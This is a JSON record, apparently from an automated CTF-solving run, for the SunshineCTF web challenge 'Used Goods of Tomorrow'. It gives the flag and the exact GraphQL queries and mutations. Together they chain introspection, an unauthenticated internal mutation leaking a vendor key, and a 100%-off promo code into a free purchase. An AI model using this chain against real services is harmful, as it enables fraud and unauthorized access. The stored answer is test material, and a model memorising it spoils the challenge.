@@ -1,0 +1,56 @@
+{
+  "version": 1,
+  "current_key": "3d51666c85a714fc7249:platform_confirmed",
+  "status": "complete",
+  "records": [
+    {
+      "key": "3d51666c85a714fc7249:platform_confirmed",
+      "flag": "sun{1_l0v3_fr33_stuff}",
+      "confirmation_source": "platform_confirmed",
+      "model_spec": "deepseek/deepseek-flash",
+      "run_id": "2e89db975cdc455fb8c92690d2211e7f",
+      "verified_by": [],
+      "challenge": {
+        "name": "Used Goods of Tomorrow",
+        "category": "web",
+        "description": "Come to Tommorow-Mart for all your used goods! We even have a partnership with FutureBank to grant you 500 free credits to start!",
+        "connection_info": "https://usedgoods.web.2026.sunshinectf.games/",
+        "value": 407,
+        "tags": [],
+        "hints": []
+      },
+      "findings_summary": "Flag found via GraphQL API abuse: enabled internal mutation leaks vendor master key -> query promo table -> 100% off promo to buy the $1,000,000 prize lot for 0 credits: sun{1_l0v3_fr33_stuff} | Evidence: GraphQL endpoint /graphql with introspection exposes an internal mutation vendorTerminalSync (description: 'INTERNAL / MAINTENANCE ... Left enabled from the closed beta'). ; Calling `mutation{vendorTerminalSync{terminalId status firmware vendorKey note}}` without any auth returned vendorKey=VND-MASTER-21d5f80206dffb6fa9ad5722. ; Query `{promoCodes(vendorKey:\"VND-MASTER-21d5f80206dffb6fa9ad5722\"){code description percentOff appliesTo}}` returned the discount table including FOUNDERS-100: '100% off Lot #4042. Internal use only.' (appliesTo=4042). ; Listing 4042 'Founders' Vault Deed (SEALED)' costs priceCredits=1,000,000 while new accounts only get 500 credits. ; Calling `mutation($id:ID!,$promo:String){placeOrder(listingId:$id,promoCode:$promo){success message listingId pricePaid flag}}` with id=4042, promoCode=FOUNDERS-100 returned success=true, pricePaid=0 and flag=sun{1_l0v3_fr33_stuff}.",
+      "solution_steps": [
+        "枚举 GraphQL：POST /graphql 使用内省查询 {__schema{...}}，发现隐藏的内部变更 vendorTerminalSync(terminalId: ID) 会返回 VendorDiagnostics（含 vendorKey）。",
+        "无需鉴权调用 mutation{vendorTerminalSync{terminalId status firmware vendorKey note}}，泄露 vendorKey=VND-MASTER-21d5f80206dffb6fa9ad5722。",
+        "用泄露的 vendorKey 调用 promoCodes(vendorKey:...)，得到促销表，其中 FOUNDERS-100 = 对 Lot #4042 打 100% 折扣（内部使用）。",
+        "注册账号（500 初始信用点）后对 listingId=4042 调用 placeOrder(listingId:\"4042\", promoCode:\"FOUNDERS-100\")，价格变为 0，成功购买到价值 1,000,000 的保险箱地契。",
+        "Receipt 的 flag 字段返回 sun{1_l0v3_fr33_stuff}。"
+      ],
+      "evidence": [
+        "GraphQL endpoint /graphql with introspection exposes an internal mutation vendorTerminalSync (description: 'INTERNAL / MAINTENANCE ... Left enabled from the closed beta').",
+        "Calling `mutation{vendorTerminalSync{terminalId status firmware vendorKey note}}` without any auth returned vendorKey=VND-MASTER-21d5f80206dffb6fa9ad5722.",
+        "Query `{promoCodes(vendorKey:\"VND-MASTER-21d5f80206dffb6fa9ad5722\"){code description percentOff appliesTo}}` returned the discount table including FOUNDERS-100: '100% off Lot #4042. Internal use only.' (appliesTo=4042).",
+        "Listing 4042 'Founders' Vault Deed (SEALED)' costs priceCredits=1,000,000 while new accounts only get 500 credits.",
+        "Calling `mutation($id:ID!,$promo:String){placeOrder(listingId:$id,promoCode:$promo){success message listingId pricePaid flag}}` with id=4042, promoCode=FOUNDERS-100 returned success=true, pricePaid=0 and flag=sun{1_l0v3_fr33_stuff}.",
+        "Platform submission page showed alert 'Correct' and confirm_submission returned CORRECT."
+      ],
+      "saved_exp_paths": [],
+      "exp_run_command": "python3 /challenge/workspace/exploit.py",
+      "status": "complete",
+      "replay": {
+        "status": "manual",
+        "reason": "没有可自动运行的 EXP；请按题解步骤人工复现。",
+        "command": "",
+        "exit_code": null,
+        "stdout": "",
+        "stderr": ""
+      },
+      "writeup_sha256": "95ea1d993f1d8331d3d3ced512d4df89d922939fb3632476bf587b47db8c6045",
+      "planned_sha256": null,
+      "created_at": "2026-09-27T03:11:42.050255+00:00",
+      "updated_at": "2026-09-27T03:11:53.019847+00:00",
+      "exp_sha256": {}
+    }
+  ]
+}
